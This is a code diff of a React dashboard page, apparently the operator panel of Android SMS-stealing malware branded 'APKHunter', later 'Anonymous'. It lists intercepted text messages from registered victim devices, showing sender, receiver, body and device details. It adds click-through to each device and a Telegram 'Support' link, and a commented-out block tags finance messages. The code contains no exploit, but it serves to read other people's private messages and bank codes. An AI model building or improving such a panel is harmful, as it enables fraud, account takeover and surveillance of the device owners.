@@ -30,7 +30,6 @@ type NotificationItem = {
   deviceBrand?: string;
   deviceModel?: string;
   androidVersion?: number;
-  deviceStatus?: string;
 };
 
 const INITIAL_VISIBLE = 30;
@@ -84,13 +83,6 @@ function formatTimestamp(value: string) {
   });
 }
 
-const links = [
-  { label: "Home", href: "/" },
-  { label: "Dashboard", href: "/dashboard" },
-  { label: "Messages", href: "/messages" },
-  { label: "Devices", href: "/devices" },
-];
-
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<NotificationItem[]>([]);
   const [searchQuery, setSearchQuery] = useState("");
@@ -102,7 +94,6 @@ export default function NotificationsPage() {
   const loadingMoreRef = useRef(false);
 
   useEffect(() => {
-    // Safety net: never stay stuck on "loading" for more than 10 s
     const timeoutId = setTimeout(() => {
       setIsLoading(false);
     }, 10_000);
@@ -112,7 +103,6 @@ export default function NotificationsPage() {
     const unsubscribe = onValue(
       registeredDevicesRef,
       (snapshot) => {
-        // Clear loading immediately so a throw below never blocks the UI
         clearTimeout(timeoutId);
         setIsLoading(false);
 
@@ -139,8 +129,6 @@ export default function NotificationsPage() {
           const deviceBrand = (deviceData as any).brand || "Unknown";
           const deviceModel = (deviceData as any).model || "Unknown";
           const androidVersion = (deviceData as any).androidVersion;
-          const isOnline =
-            (deviceData as any).checkOnline?.available === "Device is online";
 
           for (const [messageId, payload] of Object.entries(smsLogs)) {
             if (!payload || typeof payload !== "object") {
@@ -151,8 +139,8 @@ export default function NotificationsPage() {
 
             normalizedNotifications.push({
               id: `${deviceId}-${messageId}`,
-              deviceId,
-              messageId,
+              deviceId: deviceId,
+              messageId: messageId,
               title: toSafeText(normalizedPayload.title, "New SMS"),
               body: toSafeText(normalizedPayload.body, "No message body"),
               senderNumber: toSafeText(
@@ -168,7 +156,6 @@ export default function NotificationsPage() {
               deviceBrand,
               deviceModel,
               androidVersion,
-              deviceStatus: isOnline ? "online" : "offline",
             });
           }
         }
@@ -205,7 +192,6 @@ export default function NotificationsPage() {
       result = result.filter((item) => {
         const values = [
           item.deviceId,
-          item.messageId,
           item.title,
           item.body,
           item.senderNumber,
@@ -232,14 +218,15 @@ export default function NotificationsPage() {
 
   const hasMore = visibleCount < filteredNotifications.length;
 
-  const copyToClipboard = async (text: string) => {
+  const copyToClipboard = async (text: string, e: React.MouseEvent) => {
+    e.stopPropagation();
+    
     if (typeof window === "undefined") {
       return;
     }
 
     try {
       await navigator.clipboard.writeText(text);
-      return;
     } catch {
       const textarea = document.createElement("textarea");
       textarea.value = text;
@@ -252,10 +239,21 @@ export default function NotificationsPage() {
       document.body.removeChild(textarea);
     }
   };
+  
   const router = useRouter();
   const pathname = usePathname();
 
-  // IntersectionObserver — appends next 20 when sentinel enters viewport
+  // Handle card click - Open in NEW TAB
+  const handleCardClick = (deviceId: string) => {
+    if (!deviceId || deviceId === "Unknown") {
+      return;
+    }
+    
+    // Open in new tab
+    const url = `/devices/${deviceId}`;
+    window.open(url, '_blank');
+  };
+
   useEffect(() => {
     const observer = new IntersectionObserver(
       (entries) => {
@@ -290,7 +288,7 @@ export default function NotificationsPage() {
       <header className="w-full bg-black">
         <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
           <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
-            APKHunter
+            Anonymous
           </Link>
           <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
@@ -299,14 +297,14 @@ export default function NotificationsPage() {
             <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Setting
             </Link>
-            <a
-              href="https://t.me/AH_Support_bot"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-white/85 transition-colors hover:text-white"
-            >
-              Support
-            </a>
+ <a
+  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
+  target="_blank"
+  rel="noopener noreferrer"
+  className="text-white/85 transition-colors hover:text-white"
+>
+  Support
+</a>
             <button
               onClick={async () => {
                 await fetch("/api/logout", { method: "POST" });
@@ -347,162 +345,136 @@ export default function NotificationsPage() {
               type="text"
               value={searchQuery}
               onChange={(event) => setSearchQuery(event.target.value)}
-              placeholder="Search Messages"
+              placeholder="Search by Device ID, Message, Sender, etc..."
               className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
             />
           </div>
         </div>
 
-            <div className="space-y-3">
-              {isLoading && (
-                <LineSpinner />
-              )}
+        <div className="space-y-3 mt-6">
+          {isLoading && <LineSpinner />}
 
-              {!isLoading && fetchError && (
-                <div className="rounded-xl border border-rose-300 bg-rose-50 p-6">
-                  <p className="text-sm text-rose-700">{fetchError}</p>
-                </div>
-              )}
-
-              {!isLoading &&
-                !fetchError &&
-                filteredNotifications.length === 0 && (
-                  <div className="rounded-xl border border-[#d6d6d6] bg-white p-8 text-center text-sm text-gray-500">
-                    No notifications match this view.
-                  </div>
-                )}
-
-              {!isLoading &&
-                !fetchError &&
-                visibleItems.map((item) => {
-                  return (
-                    <Card
-                      key={item.id}
-                      className=" rounded-0 border border-(--border) bg-white/78 shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
-                    >
-                      <CardBody className="space-y-4 p-4 sm:p-5">
-                        <div>
-                          <span className=" font-bold text-blue-950  flex flex-row">
-                            DATE{" "}
-                            <BiCopy
-                              onClick={() =>
-                                copyToClipboard(formatTimestamp(item.timestamp))
-                              }
-                            ></BiCopy>
-                          </span>
-                          <p className="text-[11px] font-semibold uppercase tracking-wide text-(--text-muted)">
-                            {formatTimestamp(item.timestamp)}
-                          </p>
-                          <span className=" font-bold text-blue-950  flex flex-row">
-                            MSG{" "}
-                            <BiCopy
-                              onClick={() => copyToClipboard(item.body)}
-                            ></BiCopy>
-                          </span>
-                          <p className=" text-[13px] text-red-600">
-                            {item.body}
-                          </p>
-                          <span className=" font-bold text-blue-950  flex flex-row">
-                            SENDER{" "}
-                            <BiCopy
-                              onClick={() => copyToClipboard(item.senderNumber)}
-                            ></BiCopy>
-                          </span>
-                          <p className=" text-[13px] text-(--text-muted)">
-                            {item.senderNumber}
-                          </p>
-                          {item.receiverNumber && (
-                            <>
-                              <span className=" font-bold text-blue-950  flex flex-row">
-                                RECIVER{" "}
-                                <BiCopy
-                                  onClick={() =>
-                                    copyToClipboard(
-                                      formatTimestamp(item.timestamp),
-                                    )
-                                  }
-                                ></BiCopy>
-                              </span>
-                              <p className=" text-[13px] text-(--text-muted)">
-                                {item.receiverNumber}
-                              </p>
-                            </>
-                          )}
-                          <span className=" font-bold text-blue-950  flex flex-row">
-                            ID{" "}
-                            <BiCopy
-                              onClick={() =>
-                                copyToClipboard(formatTimestamp(item.timestamp))
-                              }
-                            ></BiCopy>
-                          </span>
-                          <p className=" text-[13px] text-(--text-muted)">
-                            {item.messageId}
-                          </p>
-                        </div>
-                      </CardBody>
-                    </Card>
-                  );
-                })}
-
-              {/* Sentinel div — observed by IntersectionObserver */}
-              {!isLoading && !fetchError && (
-                <div ref={loaderRef} className="h-1 w-full" />
-              )}
-
-              {isLoadingMore && (
-                <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500">
-                  <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-[#d4bb41]" />
-                  <span>Loading more notifications...</span>
-                </div>
-              )}
-
-              {!isLoading &&
-                !fetchError &&
-                !hasMore &&
-                filteredNotifications.length > 0 && (
-                  <p className="py-6 text-center text-sm text-gray-500">
-                    All {filteredNotifications.length} notifications loaded.
-                  </p>
-                )}
+          {!isLoading && fetchError && (
+            <div className="rounded-xl border border-rose-300 bg-rose-50 p-6">
+              <p className="text-sm text-rose-700">{fetchError}</p>
             </div>
+          )}
+
+          {!isLoading && !fetchError && filteredNotifications.length === 0 && (
+            <div className="rounded-xl border border-[#d6d6d6] bg-white p-8 text-center text-sm text-gray-500">
+              No messages found.
+            </div>
+          )}
+
+          {!isLoading && !fetchError && visibleItems.map((item) => (
+            <div
+              key={item.id}
+              onClick={() => handleCardClick(item.deviceId)}
+              style={{ cursor: 'pointer' }}
+              className="block"
+            >
+              <Card className="border border-[#d6d6d6] bg-white/78 shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
+                <CardBody className="space-y-4 p-4 sm:p-5">
+                  <div>
+                    <div className="flex items-center justify-between mb-3 pb-2 border-b border-gray-200">
+                      <div className="flex items-center gap-2">
+                        <span className="text-xs font-bold text-gray-500">DEVICE ID:</span>
+                        <span className="text-sm font-mono font-bold text-blue-700 bg-blue-50 px-2 py-1 rounded">
+                          {item.deviceId}
+                        </span>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center justify-between mb-2">
+                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
+                        DATE
+                        <BiCopy
+                          onClick={(e) => copyToClipboard(formatTimestamp(item.timestamp), e)}
+                          className="cursor-pointer hover:text-gray-600 text-sm"
+                          size={14}
+                        />
+                      </span>
+                    </div>
+                    <p className="text-[11px] font-semibold uppercase tracking-wide text-gray-500 mb-3">
+                      {formatTimestamp(item.timestamp)}
+                    </p>
+                    
+                    <div className="flex items-center gap-1 mt-2">
+                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
+                        MESSAGE
+                        <BiCopy
+                          onClick={(e) => copyToClipboard(item.body, e)}
+                          className="cursor-pointer hover:text-gray-600 text-sm"
+                          size={14}
+                        />
+                      </span>
+                    </div>
+                    <p className="text-[13px] text-red-600 mb-2">
+                      {item.body}
+                    </p>
+                    
+                    <div className="flex items-center gap-1 mt-2">
+                      <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
+                        SENDER
+                        <BiCopy
+                          onClick={(e) => copyToClipboard(item.senderNumber, e)}
+                          className="cursor-pointer hover:text-gray-600 text-sm"
+                          size={14}
+                        />
+                      </span>
+                    </div>
+                    <p className="text-[13px] text-gray-600 mb-2">
+                      {item.senderNumber}
+                    </p>
+                    
+                    {item.receiverNumber && item.receiverNumber !== "Unknown receiver" && (
+                      <>
+                        <div className="flex items-center gap-1 mt-2">
+                          <span className="font-bold text-blue-950 flex flex-row items-center gap-1">
+                            RECEIVER
+                            <BiCopy
+                              onClick={(e) => copyToClipboard(item.receiverNumber, e)}
+                              className="cursor-pointer hover:text-gray-600 text-sm"
+                              size={14}
+                            />
+                          </span>
+                        </div>
+                        <p className="text-[13px] text-gray-600 mb-2">
+                          {item.receiverNumber}
+                        </p>
+                      </>
+                    )}
+                    
+                    {(item.deviceBrand || item.deviceModel) && (
+                      <div className="mt-3 pt-2 border-t border-gray-200">
+                        <p className="text-[11px] text-gray-500">
+                          📱 {item.deviceBrand} {item.deviceModel}
+                          {item.androidVersion && ` • Android ${item.androidVersion}`}
+                        </p>
+                      </div>
+                    )}
+                  </div>
+                </CardBody>
+              </Card>
+            </div>
+          ))}
+
+          {!isLoading && !fetchError && <div ref={loaderRef} className="h-1 w-full" />}
+
+          {isLoadingMore && (
+            <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500">
+              <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-[#d4bb41]" />
+              <span>Loading more messages...</span>
+            </div>
+          )}
+
+          {!isLoading && !fetchError && !hasMore && filteredNotifications.length > 0 && (
+            <p className="py-6 text-center text-sm text-gray-500">
+              All {filteredNotifications.length} messages loaded.
+            </p>
+          )}
+        </div>
       </main>
     </div>
   );
 }
-
-//  <div className="flex flex-wrap items-start justify-between gap-3">
-//                           <div>
-//                             <p className="text-[11px] font-semibold uppercase tracking-wide text-(--text-muted)">
-//                               {formatRelativeTime(item.timestamp)} · {formatTimestamp(item.timestamp)}
-//                             </p>
-//                             <p className="mt-1 text-base font-bold text-(--text-main)">
-//                               {item.title || "SMS Notification"}
-//                             </p>
-//                             <p className="text-[11px] text-(--text-soft)">
-//                               {item.deviceBrand} · {item.deviceModel}
-//                             </p>
-//                           </div>
-
-//                           <div className="flex flex-wrap items-center gap-2">
-//                             {finance ? (
-//                               <Chip
-//                                 size="sm"
-//                                 className="border border-amber-200 bg-amber-50 text-xs text-amber-700"
-//                               >
-//                                 Finance
-//                               </Chip>
-//                             ) : null}
-
-//                             <Chip
-//                               size="sm"
-//                               className={
-//                                 status === "online"
-//                                   ? "border border-emerald-200 bg-emerald-50 text-xs text-emerald-700"
-//                                   : "border border-rose-200 bg-rose-50 text-xs text-rose-700"
-//                               }
-//                             >
-//                               {status === "online" ? "Online" : "Offline"}
-//                             </Chip>
-//                           </div>
-//                         </div>
